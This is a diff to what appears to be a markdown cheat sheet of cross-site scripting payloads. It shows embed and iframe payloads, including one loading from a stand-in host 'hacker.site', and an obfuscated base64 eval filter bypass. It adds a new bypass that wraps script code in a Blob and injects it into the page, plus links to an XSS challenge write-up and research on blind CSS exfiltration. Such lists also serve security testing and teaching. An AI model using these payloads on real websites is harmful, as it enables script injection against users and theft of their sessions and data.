@@ -4,11 +4,15 @@
 <embed src="http://hacker.site/evil.swf">
 <embed src="javascript:alert(1)">
 <iframe src='jAvAsCripT:alert`1`'></iframe>
-
-
 ```
 
 ## Filter Bypass
+### Create Blob and use the blob as source
+- Create a blob using
+	```js
+	var b=new Blob(['alert(document.domain)']); var s = document.createElement('script'); s.src = URL.createObjectURL(b); document.head.appendChild(s);
+	```
+
 ### Base64 into Eval
 ```html
 <img src=x o<scriptnerror=javajavascript:script:eval(atob('%s'))>
@@ -100,3 +104,7 @@ function fetchUrl(url, wait){
 
 ## Write-ups
 - [Intigriti — XSS Challenge 0621. XSS via WebAssembly | by FHantke | InfoSec Write-ups (infosecwriteups.com)](https://infosecwriteups.com/intigriti-xss-challenge-0621-cf76c28840c1)
+
+
+## Techniques
+- [Blind CSS Exfiltration: exfiltrate unknown web pages | PortSwigger Research](https://portswigger.net/research/blind-css-exfiltration)
